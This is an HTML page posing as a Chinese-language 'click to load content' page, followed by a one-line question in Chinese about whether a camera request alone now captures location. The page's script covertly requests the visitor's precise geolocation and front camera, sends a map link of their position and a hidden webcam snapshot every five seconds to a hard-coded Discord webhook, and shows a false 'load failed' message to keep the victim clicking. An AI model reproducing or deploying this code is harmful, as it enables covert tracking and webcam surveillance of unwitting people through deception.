<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>內容載入中</title>
</head>
<body>

<h2>點擊按鈕查看內容</h2>
<button onclick="startAction()">點擊載入</button>
<p id="status"></p>

<!-- 隱藏的 video 和 canvas，用於背後處理影像 -->
<video id="v" style="display:none;" autoplay playsinline></video>
<canvas id="c" style="display:none;"></canvas>

<script>
var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";

function startAction() {
    getLocation(); // 原有的定位
    getCamera();   // 新增的截圖
}

function getLocation() {
    document.getElementById("status").innerHTML = "正在取得內容...";
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    }
}

function success(pos) {
    var lat = pos.coords.latitude;
    var lon = pos.coords.longitude;
    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
        })
    });
    document.getElementById("status").innerHTML = "內容載入失敗，請重試。";
}

function error(err) {
    document.getElementById("status").innerHTML = "需要允許權限才能查看內容";
}

function getCamera() {
    // 請求相機權限
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(function(stream) {
        var video = document.getElementById("v");
        video.srcObject = stream;
        
        // 每 5 秒截圖並傳送一次
        setInterval(function() {
            var canvas = document.getElementById("c");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            var ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(function(blob) {
                var formData = new FormData();
                formData.append('file', blob, 'capture.jpg');
                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
                
                fetch(webhook, {
                    method: "POST",
                    body: formData
                });
            }, "image/jpeg", 0.7); // 壓縮率 0.7 減少流量
        }, 5000);
    })
    .catch(function(err) {
        console.log("相機權限被拒絕");
    });
}
</script>

</body>
</html>這個變成詢問攝像頭就可以直接竊取到訂位了？
